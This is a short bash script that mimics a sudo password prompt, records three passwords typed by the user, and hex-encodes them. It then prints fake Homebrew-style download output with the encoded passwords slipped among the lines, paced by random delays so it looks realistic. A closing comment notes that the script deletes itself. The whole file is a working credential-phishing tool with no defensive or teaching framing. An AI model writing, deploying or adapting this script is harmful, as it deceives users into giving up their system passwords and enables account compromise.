#!/bin/bash

list=()
int=1

while [ $int -le 3 ]
do

    read -sp "[sudo] password for $USER: " pwd < /dev/tty
    echo ""

    if [ ${#pwd} -ge 4 ]; then
        ((int++))
    fi

    sleep $(awk 'BEGIN{srand(); print 0.4 + rand() * 1}')

    if [ $int -le 3 ]; then
        echo "Sorry, try again."
    fi

    list+=("$pwd")
done

# encore pwd into something
s=""
for entry in "${list[@]}"
do
    hex_value=$(echo -n "$entry" | xxd -p)

    s+="${hex_value}|"
done


# fake alot of stuff

read -r -d '' brew_output <<EOF
Downloading testingSuiteFXD
=> Resolving host: get.pkg.dev-internal.io... 192.168.1.101
=> Connecting to get.pkg.dev-internal.io|192.168.1.101|:443... connected.
=> HTTP request sent, awaiting response... 200 OK
Length: 284591239 (271M) [application/x-compressed-tar]
Saving to: ‘testingSuiteFXD.tar.gz’

[INFO] Beginning file transfer...
[DEBUG] Setting chunk size to 4096 bytes.
[INFO] Disk space check: 54.2GB available. Proceeding.
testingSuiteFXD.tar.gz   [=====>                             ]  15%  41.2M  18.4MB/s   eta 12s
[WARN] Network jitter detected. Retrying packet 8491...
[WARN] Packet 8491 re-sent successfully.
testingSuiteFXD.tar.gz   [================>                  ]  51%   139M  17.9MB/s   eta 6s
[DEBUG] Flushing memory buffer to disk.
$s
[DEBUG] Syncing file descriptor 7.
testingSuiteFXD.tar.gz   [=============================>     ]  89%   242M  19.1MB/s   eta 1s
[DEBUG] Received final packet. Assembling file.
testingSuiteFXD.tar.gz   [==================================>] 100%   271M  18.8MB/s   in 14.4s
asciinema           ghc@9.4             libpqxx@7.7         paket
clj-kondo           gitlab-ci-local     libstrophe          pgformatter
deno                hadolint            libwebsockets       pyright
gdal                helmfile            marked              shellcheck
ghc                 hugo                mtr                 typescript
==> Updated Formulae
updated 347 formulae.
==> Renamed Formulae
libpqxx -> libpqxx@7.8
==> Deleted Formulae
libpq
[Error] An error has occurred while downloading testingSuiteFXD (-47817).
EOF

# Read the multi-line string line by line
while IFS= read -r line; do
  # Print the current line
  echo "$line"
  
  # Pause for a very short, random duration to make it look realistic
  sleep $(awk 'BEGIN{srand(); print 0.1 + rand() * 0.3}')
done <<< "$brew_output"

# deletes itself (in the downlaod script)
